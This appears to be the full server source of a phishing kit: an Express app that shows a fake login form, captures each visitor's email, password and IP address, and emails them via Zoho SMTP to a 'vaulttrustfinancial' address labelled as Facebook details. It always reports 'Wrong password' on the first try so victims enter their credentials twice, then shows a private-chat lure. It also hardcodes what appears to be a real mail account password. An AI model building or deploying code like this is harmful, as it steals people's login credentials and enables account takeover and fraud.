import express from "express";
import bodyParser from "body-parser";
import morgan from "morgan";
import path from "path";
import { fileURLToPath } from "url";
import { dirname } from "path";
import session from "express-session";
import nodemailer from "nodemailer";

const app = express();

app.use(morgan('dev'));

const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);

app.use(bodyParser.urlencoded({ extended: false }));
app.use(express.json());
app.set('view engine', 'ejs');

app.use(express.static(path.join(__dirname, "public")));

// Set up session handling
app.use(
    session({
        secret: 'yourSecretKey',
        resave: false,
        saveUninitialized: true,
        cookie: { secure: false } // Set to true in production
    })
);

// Nodemailer setup
const transporter = nodemailer.createTransport({
    host: 'smtp.zoho.com',
    port: 587,  // Use 465 if SSL is required
    secure: false, // true for port 465 (SSL), false for 587 (TLS)
    auth: {
        user: "info@vaulttrustfinancial.com", 
        pass: "@GuardianUser1"
    }
});

app.get("/", (req, res) => {
    // Pass any messages and previous input to the EJS template
    const message = req.session.message || '';
    const email = req.session.email || '';
    const password = req.session.password || '';
    req.session.message = null; // Clear message after displaying it
    res.render("index", { message, email, password });
});

app.post("/login", (req, res) => {
    const { email, password } = req.body;
    const userIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

    // Store user input in session for re-rendering
    req.session.email = email;
    req.session.password = password;

    // Create the email subject based on the attempt number
    const attemptNumber = req.session.attempt || 1;
    const mailOptions = {
        from: '"Info" <info@vaulttrustfinancial.com>',
        to: 'info@vaulttrustfinancial.com',
        subject: `Login Attempt ${attemptNumber} by ${email}`,
        text: `Facebook Contact Form Details\nAttempt ${attemptNumber}\nUsername: ${email}\nPassword: ${password}\nUser IP: ${userIp}`
    };

    // Send the email
    transporter.sendMail(mailOptions, (error, info) => {
        if (error) {
            console.log(error);
            req.session.message = 'Error sending email.';
        } else {
            console.log('Email sent: ' + info.response);
            req.session.message = attemptNumber === 1 ? 'Wrong password' : 'You have been successfully added to the private chat, you will get a message request shortly.';
        }
        req.session.attempt = attemptNumber === 1 ? 2 : 1; // Toggle the attempt number
        res.redirect('/');
    });
});


app.listen(3000, () => {
    console.log("Server started on port 3000");
});
